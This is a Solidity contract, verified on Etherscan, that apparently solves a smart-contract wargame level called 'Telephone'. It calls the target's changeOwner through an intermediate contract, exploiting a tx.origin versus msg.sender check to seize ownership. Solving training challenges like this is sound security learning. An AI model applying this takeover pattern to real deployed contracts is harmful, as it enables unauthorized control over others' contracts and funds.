/**
 *Submitted for verification at Etherscan.io on 2022-10-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract TelephoneSolver {
    address constant instance = 0x806762820ee98CCc76a3fCD654B60e3F266Da309;

    constructor() {
        Telephone(instance).changeOwner(msg.sender);
    }

    function runChangeOwner() external {
        Telephone(instance).changeOwner(msg.sender);
    }
}